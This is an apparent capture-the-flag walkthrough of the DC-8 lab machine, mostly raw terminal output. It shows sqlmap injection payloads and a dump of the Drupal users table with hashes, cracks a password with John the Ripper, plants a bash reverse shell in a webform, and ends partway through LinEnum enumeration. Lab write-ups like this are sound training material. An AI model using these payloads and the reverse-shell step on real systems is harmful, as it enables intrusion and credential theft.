+ ___ ___[.]_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                   
+|_ -| . [.]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:44:46 /2021-05-20/
+
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[00:44:51] [INFO] resuming back-end DBMS 'mysql' 
+[00:44:51] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.1.14:80/?nid=1 AND 3105=3105
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 2597 FROM(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(2597=2597,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))DhtJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.1.14:80/?nid=-1157 UNION ALL SELECT CONCAT(0x7170767a71,0x674f644e4354416a506e51436b65555552715a7a79527a4e5754794b4c7a786a63456f4f614c4851,0x716a767071)-- -
+---
+[00:44:51] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+[00:44:51] [INFO] fetching database names
+[00:44:51] [WARNING] reflective value(s) found and filtering out
+[00:44:52] [WARNING] potential permission problems detected ('command denied')
+[00:44:52] [INFO] retrieved: 'd7db'
+[00:44:52] [INFO] retrieved: 'information_schema'
+available databases [2]:                                                                                                                                                                                                                  
+[*] d7db
+[*] information_schema
+
+[00:44:52] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+[00:44:52] [INFO] fetched data logged to text files under '/home/jeff/.local/share/sqlmap/output/192.168.1.14'
+
+[*] ending @ 00:44:52 /2021-05-20/
+
+--------------------
+
+=> We list the tables of the database 'd7db'
+
+
+jeff@kali:~$ sqlmap  -D d7db --tables -u "http://192.168.1.14/?nid=1*"
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[(]_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                   
+|_ -| . [,]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:51:58 /2021-05-20/
+
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[00:52:00] [INFO] resuming back-end DBMS 'mysql' 
+[00:52:00] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.1.14:80/?nid=1 AND 3105=3105
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 2597 FROM(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(2597=2597,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))DhtJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.1.14:80/?nid=-1157 UNION ALL SELECT CONCAT(0x7170767a71,0x674f644e4354416a506e51436b65555552715a7a79527a4e5754794b4c7a786a63456f4f614c4851,0x716a767071)-- -
+---
+[00:52:00] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+[00:52:00] [INFO] fetching tables for database: 'd7db'
+[00:52:00] [WARNING] reflective value(s) found and filtering out
+[00:52:00] [WARNING] potential permission problems detected ('command denied')
+[00:52:01] [INFO] retrieved: 'actions'
+[00:52:01] [INFO] retrieved: 'authmap'
+[00:52:01] [INFO] retrieved: 'batch'
+[00:52:01] [INFO] retrieved: 'block'
+[00:52:01] [INFO] retrieved: 'block_custom'
+[00:52:01] [INFO] retrieved: 'block_node_type'
+[00:52:01] [INFO] retrieved: 'block_role'
+[00:52:01] [INFO] retrieved: 'blocked_ips'
+[00:52:01] [INFO] retrieved: 'cache'
+[00:52:01] [INFO] retrieved: 'cache_block'
+[00:52:01] [INFO] retrieved: 'cache_bootstrap'
+[00:52:01] [INFO] retrieved: 'cache_field'
+[00:52:01] [INFO] retrieved: 'cache_filter'
+[00:52:01] [INFO] retrieved: 'cache_form'
+[00:52:02] [INFO] retrieved: 'cache_image'
+[00:52:02] [INFO] retrieved: 'cache_menu'
+[00:52:02] [INFO] retrieved: 'cache_page'
+[00:52:02] [INFO] retrieved: 'cache_path'
+[00:52:02] [INFO] retrieved: 'cache_views'
+[00:52:02] [INFO] retrieved: 'cache_views_data'
+[00:52:02] [INFO] retrieved: 'ckeditor_input_format'
+[00:52:02] [INFO] retrieved: 'ckeditor_settings'
+[00:52:02] [INFO] retrieved: 'ctools_css_cache'
+[00:52:02] [INFO] retrieved: 'ctools_object_cache'
+[00:52:02] [INFO] retrieved: 'date_format_locale'
+[00:52:02] [INFO] retrieved: 'date_format_type'
+[00:52:02] [INFO] retrieved: 'date_formats'
+[00:52:02] [INFO] retrieved: 'field_config'
+[00:52:02] [INFO] retrieved: 'field_config_instance'
+[00:52:02] [INFO] retrieved: 'field_data_body'
+[00:52:02] [INFO] retrieved: 'field_data_field_image'
+[00:52:02] [INFO] retrieved: 'field_data_field_tags'
+[00:52:02] [INFO] retrieved: 'field_revision_body'
+[00:52:02] [INFO] retrieved: 'field_revision_field_image'
+[00:52:02] [INFO] retrieved: 'field_revision_field_tags'
+[00:52:02] [INFO] retrieved: 'file_managed'
+[00:52:02] [INFO] retrieved: 'file_usage'
+[00:52:02] [INFO] retrieved: 'filter'
+[00:52:02] [INFO] retrieved: 'filter_format'
+[00:52:02] [INFO] retrieved: 'flood'
+[00:52:02] [INFO] retrieved: 'history'
+[00:52:02] [INFO] retrieved: 'image_effects'
+[00:52:02] [INFO] retrieved: 'image_styles'
+[00:52:02] [INFO] retrieved: 'menu_custom'
+[00:52:03] [INFO] retrieved: 'menu_links'
+[00:52:03] [INFO] retrieved: 'menu_router'
+[00:52:03] [INFO] retrieved: 'node'
+[00:52:03] [INFO] retrieved: 'node_access'
+[00:52:03] [INFO] retrieved: 'node_revision'
+[00:52:03] [INFO] retrieved: 'node_type'
+[00:52:03] [INFO] retrieved: 'queue'
+[00:52:03] [INFO] retrieved: 'rdf_mapping'
+[00:52:03] [INFO] retrieved: 'registry'
+[00:52:03] [INFO] retrieved: 'registry_file'
+[00:52:03] [INFO] retrieved: 'role'
+[00:52:03] [INFO] retrieved: 'role_permission'
+[00:52:03] [INFO] retrieved: 'search_dataset'
+[00:52:03] [INFO] retrieved: 'search_index'
+[00:52:03] [INFO] retrieved: 'search_node_links'
+[00:52:03] [INFO] retrieved: 'search_total'
+[00:52:03] [INFO] retrieved: 'semaphore'
+[00:52:03] [INFO] retrieved: 'sequences'
+[00:52:03] [INFO] retrieved: 'sessions'
+[00:52:03] [INFO] retrieved: 'shortcut_set'
+[00:52:03] [INFO] retrieved: 'shortcut_set_users'
+[00:52:03] [INFO] retrieved: 'site_messages_table'
+[00:52:03] [INFO] retrieved: 'system'
+[00:52:03] [INFO] retrieved: 'taxonomy_index'
+[00:52:03] [INFO] retrieved: 'taxonomy_term_data'
+[00:52:03] [INFO] retrieved: 'taxonomy_term_hierarchy'
+[00:52:03] [INFO] retrieved: 'taxonomy_vocabulary'
+[00:52:03] [INFO] retrieved: 'url_alias'
+[00:52:03] [INFO] retrieved: 'users'
+[00:52:03] [INFO] retrieved: 'users_roles'
+[00:52:04] [INFO] retrieved: 'variable'
+[00:52:04] [INFO] retrieved: 'views_display'
+[00:52:04] [INFO] retrieved: 'views_view'
+[00:52:04] [INFO] retrieved: 'watchdog'
+[00:52:04] [INFO] retrieved: 'webform'
+[00:52:04] [INFO] retrieved: 'webform_component'
+[00:52:04] [INFO] retrieved: 'webform_conditional'
+[00:52:04] [INFO] retrieved: 'webform_conditional_actions'
+[00:52:04] [INFO] retrieved: 'webform_conditional_rules'
+[00:52:04] [INFO] retrieved: 'webform_emails'
+[00:52:04] [INFO] retrieved: 'webform_last_download'
+[00:52:04] [INFO] retrieved: 'webform_roles'
+[00:52:04] [INFO] retrieved: 'webform_submissions'
+[00:52:04] [INFO] retrieved: 'webform_submitted_data'
+Database: d7db                                                                                                                                                                                                                            
+[88 tables]
++-----------------------------+
+| filter                      |
+| system                      |
+| actions                     |
+| authmap                     |
+| batch                       |
+| block                       |
+| block_custom                |
+| block_node_type             |
+| block_role                  |
+| blocked_ips                 |
+| cache                       |
+| cache_block                 |
+| cache_bootstrap             |
+| cache_field                 |
+| cache_filter                |
+| cache_form                  |
+| cache_image                 |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| cache_views                 |
+| cache_views_data            |
+| ckeditor_input_format       |
+| ckeditor_settings           |
+| ctools_css_cache            |
+| ctools_object_cache         |
+| date_format_locale          |
+| date_format_type            |
+| date_formats                |
+| field_config                |
+| field_config_instance       |
+| field_data_body             |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_usage                  |
+| filter_format               |
+| flood                       |
+| history                     |
+| image_effects               |
+| image_styles                |
+| menu_custom                 |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_revision               |
+| node_type                   |
+| queue                       |
+| rdf_mapping                 |
+| registry                    |
+| registry_file               |
+| role                        |
+| role_permission             |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| shortcut_set                |
+| shortcut_set_users          |
+| site_messages_table         |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| taxonomy_vocabulary         |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| views_display               |
+| views_view                  |
+| watchdog                    |
+| webform                     |
+| webform_component           |
+| webform_conditional         |
+| webform_conditional_actions |
+| webform_conditional_rules   |
+| webform_emails              |
+| webform_last_download       |
+| webform_roles               |
+| webform_submissions         |
+| webform_submitted_data      |
++-----------------------------+
+
+[00:52:04] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+[00:52:04] [INFO] fetched data logged to text files under '/home/jeff/.local/share/sqlmap/output/192.168.1.14'
+
+[*] ending @ 00:52:04 /2021-05-20/
+
+---------------------
+
+=> We dump the content of the table USERS wich should contains logins and password hashes...
+
+
+jeff@kali:~$ sqlmap  -D d7db -T users --dump -u "http://192.168.1.14/?nid=1*"
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[,]_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                   
+|_ -| . [']     | .'| . |                                                                                                                                                                                                                  
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:56:22 /2021-05-20/
+
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[00:56:24] [INFO] resuming back-end DBMS 'mysql' 
+[00:56:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.1.14:80/?nid=1 AND 3105=3105
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 2597 FROM(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(2597=2597,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))DhtJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.1.14:80/?nid=-1157 UNION ALL SELECT CONCAT(0x7170767a71,0x674f644e4354416a506e51436b65555552715a7a79527a4e5754794b4c7a786a63456f4f614c4851,0x716a767071)-- -
+---
+[00:56:25] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+[00:56:25] [INFO] fetching columns for table 'users' in database 'd7db'
+[00:56:25] [WARNING] reflective value(s) found and filtering out
+[00:56:25] [WARNING] potential permission problems detected ('command denied')
+[00:56:25] [INFO] retrieved: 'uid','int(10) unsigned'
+[00:56:25] [INFO] retrieved: 'name','varchar(60)'
+[00:56:25] [INFO] retrieved: 'pass','varchar(128)'
+[00:56:25] [INFO] retrieved: 'mail','varchar(254)'
+[00:56:25] [INFO] retrieved: 'theme','varchar(255)'
+[00:56:26] [INFO] retrieved: 'signature','varchar(255)'
+[00:56:26] [INFO] retrieved: 'signature_format','varchar(255)'
+[00:56:26] [INFO] retrieved: 'created','int(11)'
+[00:56:26] [INFO] retrieved: 'access','int(11)'
+[00:56:26] [INFO] retrieved: 'login','int(11)'
+[00:56:26] [INFO] retrieved: 'status','tinyint(4)'
+[00:56:26] [INFO] retrieved: 'timezone','varchar(32)'
+[00:56:26] [INFO] retrieved: 'language','varchar(12)'
+[00:56:26] [INFO] retrieved: 'picture','int(11)'
+[00:56:26] [INFO] retrieved: 'init','varchar(254)'
+[00:56:26] [INFO] retrieved: 'data','longblob'
+[00:56:26] [INFO] fetching entries for table 'users' in database 'd7db'                                                                                                                                                                   
+[00:56:26] [INFO] retrieved: '','0','0',' ','','0','','','','0','',' ','0','',' ','0'
+[00:56:26] [INFO] retrieved: '','1567766818','1567489015','a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}','dc8blah@dc8blah.org','1567766626','dcau-user@outlook.com','admin','$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z','0',...
+[00:56:26] [INFO] retrieved: '','1567498512','1567489250','a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";}',...
+Database: d7db                                                                                                                                                                                                                            
+Table: users
+[3 entries]
++-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
+| uid | data                                                                                                                                                                        | init                | mail                  | name    | pass                                                    | login      | theme   | access     | status | created    | picture | timezone           | signature | language   | signature_format |
++-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
+| 0   | NULL                                                                                                                                                                        | <blank>             | <blank>               | <blank> | <blank>                                                 | 0          | <blank> | 0          | 0      | 0          | 0       | NULL               | <blank>   | <blank>    | NULL             |
+| 1   | a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}                                                                                                                                  | dc8blah@dc8blah.org | dcau-user@outlook.com | admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | 1567766626 | <blank> | 1567766818 | 1      | 1567489015 | 0       | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
+| 2   | a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";} | john@blahsdfsfd.org | john@blahsdfsfd.org   | john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | 1567497783 | <blank> | 1567498512 | 1      | 1567489250 | 0       | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
++-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
+
+[00:56:26] [INFO] table 'd7db.users' dumped to CSV file '/home/jeff/.local/share/sqlmap/output/192.168.1.14/dump/d7db/users.csv'
+[00:56:26] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2 times
+[00:56:26] [INFO] fetched data logged to text files under '/home/jeff/.local/share/sqlmap/output/192.168.1.14'
+
+[*] ending @ 00:56:26 /2021-05-20/
+
+
+=> There are 2 accounts (Admin and John) so let's crack their password hashes 
+
+root@kali:/home/jeff/Documents/CTFs/DC8# echo 'admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' > pwdhash.txt
+root@kali:/home/jeff/Documents/CTFs/DC8# echo 'john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' >> pwdhash.txt
+
+root@kali:/home/jeff/Documents/CTFs/DC8# cat pwdhash.txt 
+admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+
+
+root@kali:/home/jeff/Documents/CTFs/DC8# john pwdhash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+turtle           (john)
+1g 0:00:00:43 0.05% (ETA: 2021-05-21 02:34) 0.02324g/s 189.7p/s 201.4c/s 201.4C/s fudge..fantasma
+1g 0:00:00:46 0.05% (ETA: 2021-05-21 01:57) 0.02140g/s 191.1p/s 201.9c/s 201.9C/s multimedia..mental
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+
+
+=> The password protecting the account 'John' is 'turtle'
+
+--------
+
+Nexts steps after looking at all the functonalities here is the list of actions to follow to try to obtain a shell...
+
+1. Log into the website as john
+
+2. Click on the 'Contact US' page
+
+3. Then click on 'Webform" and after 'Form settings'
+
+4. Add a basic PHP reverse shell such as <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.15/1234 0>&1'");?>
+
+5. Change the code format to "PHP code" (still within the 'Form settings' page)
+
+6. Go to the 'Contact Us" page, then fill the form and submit it. 
+
+=> The PHP webshell is executed...
+
+
+
+===================================================================
+
+jeff@kali:~$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.15] from (UNKNOWN) [192.168.1.14] 50774
+bash: cannot set terminal process group (449): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@dc-8:/var/www/html$ pwd
+pwd
+/var/www/html
+
+www-data@dc-8:/var/www/html$ ls -l
+ls -l
+total 280
+-rw-r-----  1 root www-data 114096 May  9  2019 CHANGELOG.txt
+-rw-r-----  1 root www-data   1481 May  9  2019 COPYRIGHT.txt
+-rw-r-----  1 root www-data   1717 May  9  2019 INSTALL.mysql.txt
+-rw-r-----  1 root www-data   1874 May  9  2019 INSTALL.pgsql.txt
+-rw-r-----  1 root www-data   1298 May  9  2019 INSTALL.sqlite.txt
+-rw-r-----  1 root www-data  17995 May  9  2019 INSTALL.txt
+-rw-r-----  1 root www-data  18092 Nov 17  2016 LICENSE.txt
+-rw-r-----  1 root www-data   8663 May  9  2019 MAINTAINERS.txt
+-rw-r-----  1 root www-data   5382 May  9  2019 README.txt
+-rw-r-----  1 root www-data  10123 May  9  2019 UPGRADE.txt
+-rw-r-----  1 root www-data   6604 May  9  2019 authorize.php
+-rw-r-----  1 root www-data    720 May  9  2019 cron.php
+drwxr-x---  4 root www-data   4096 May  9  2019 includes
+-rw-r-----  1 root www-data    529 May  9  2019 index.php
+-rw-r-----  1 root www-data    703 May  9  2019 install.php
+drwxr-x---  6 root www-data   4096 May  9  2019 misc
+drwxr-x--- 42 root www-data   4096 May  9  2019 modules
+drwxr-x---  5 root www-data   4096 May  9  2019 profiles
+-rw-r-----  1 root www-data   2189 May  9  2019 robots.txt
+drwxr-x---  2 root www-data   4096 May  9  2019 scripts
+drwxr-x---  4 root www-data   4096 May  9  2019 sites
+drwxr-x---  7 root www-data   4096 May  9  2019 themes
+-rw-r-----  1 root www-data  19986 May  9  2019 update.php
+-rw-r-----  1 root www-data   2200 May  9  2019 web.config
+-rw-r-----  1 root www-data    417 May  9  2019 xmlrpc.php
+
+www-data@dc-8:/var/www/html$ cd /tmp
+
+
+========================================================================================================================
+Step 3. Post exploitation - Linux enumeration (LinEnum.sh + Linux-Exploit-Suggester.sh)
+========================================================================================================================
+
+
+ww-data@dc-8:/tmp$ 
+ww-data@dc-8:/tmp$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2021-05-20 09:48:17--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/plain]
+Saving to: 'LinEnum.sh'
+
+     0K .......... .......... .......... .......... .....     100% 2.18M=0.02s
+
+2021-05-20 09:48:17 (2.18 MB/s) - 'LinEnum.sh' saved [46631/46631]
+
+
+
+ww-data@dc-8:/tmp$ ls -l
+ls -l
+total 48
+-rw-r--r-- 1 www-data www-data 46631 May 20 09:48 LinEnum.sh
+
+
+www-data@dc-8:/tmp$ chmod +x LinEnum.sh 
+chmod +x LinEnum.sh
+
+
+www-data@dc-8:/tmp$ ./LinEnum.sh
+./LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Thu May 20 09:48:53 AEST 2021                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux dc-8 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.9.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.51-1 (2017-09-28)
+
+
+[-] Specific release information:
+PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
+NAME="Debian GNU/Linux"
+VERSION_ID="9"
+VERSION="9 (stretch)"
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+[-] Hostname:
+dc-8
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Thu Sep  5 00:41:29 +1000 2019
+dc8user          pts/0    192.168.0.100    Fri Sep  6 20:45:23 +1000 2019
+
+
+[-] Who else is logged on:
+ 09:48:53 up  2:23,  0 users,  load average: 0.00, 0.05, 0.45
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(messagebus) gid=109(messagebus) groups=109(messagebus)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(dc8user) gid=1000(dc8user) groups=1000(dc8user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+uid=107(mysql) gid=112(mysql) groups=112(mysql)
+uid=108(Debian-exim) gid=113(Debian-exim) groups=113(Debian-exim)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+dc8user:x:1000:1000:dc8user,,,:/home/dc8user:/bin/bash
+mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
+Debian-exim:x:108:113::/var/spool/exim4:/bin/false
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x  3 root    root    4.0K Sep  5  2019 .
+drwxr-xr-x 22 root    root    4.0K Sep  5  2019 ..
+drwxr-xr-x  2 dc8user dc8user 4.0K Sep  6  2019 dc8user
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+OLDPWD=/
+INVOCATION_ID=2acc2a7610a543fabd83aca139b87c31
+APACHE_LOCK_DIR=/var/lock/apache2
+PWD=/tmp
+JOURNAL_STREAM=8:11824
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_USER=www-data
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+SHLVL=3
+LANGUAGE=en_AU:en
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+
+
+[-] Path information:
